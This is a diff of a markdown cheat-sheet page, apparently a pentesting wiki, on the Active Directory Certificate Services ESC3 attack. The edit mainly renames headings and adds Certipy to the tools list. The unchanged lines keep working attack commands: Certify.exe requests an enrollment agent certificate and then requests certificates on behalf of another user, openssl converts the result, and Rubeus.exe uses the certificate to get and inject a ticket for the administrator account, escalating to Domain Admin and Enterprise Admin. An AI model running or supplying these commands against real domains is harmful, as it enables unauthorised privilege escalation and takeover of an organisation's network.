@@ -4,9 +4,12 @@
 Request an enrollment agent certificate and use it to request cert on behalf of ANY user
 {% endhint %}
 
-### [**Certify**](https://github.com/GhostPack/Certify)
+### Tools
 
-#### **Escalation to DA**
+* [Certify](https://github.com/GhostPack/Certify)
+* [Certipy](https://github.com/ly4k/Certipy)
+
+### **Escalation to DA**
 
 * <pre class="language-batch" data-line-numbers><code class="lang-batch">//Request cert for CertificatRequestAgent from target template.
   Certify.exe request /ca:&#x3C;CA-ServerDomain>\&#x3C;CA-Username> /template:&#x3C;target-template-name>
@@ -20,7 +23,7 @@ Request an enrollment agent certificate and use it to request cert on behalf of 
   * `openssl.exe pkcs12 -in esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out     esc3.pfx`  (password can be empty)
 * `Rubeus.exe asktgt /user:administrator /certificate:esc3user-DA.pfx /ptt` (`/password:SecretPass@123) - optional`  &#x20;
 
-#### Escalation to EA
+### Escalation to EA
 
 * <pre class="language-batch" data-line-numbers><code class="lang-batch">//Request cert for CertificatRequestAgent from target template.
   Certify.exe request /ca:&#x3C;CA-ServerDomain>\&#x3C;CA-Username> /template:&#x3C;target-template-name>
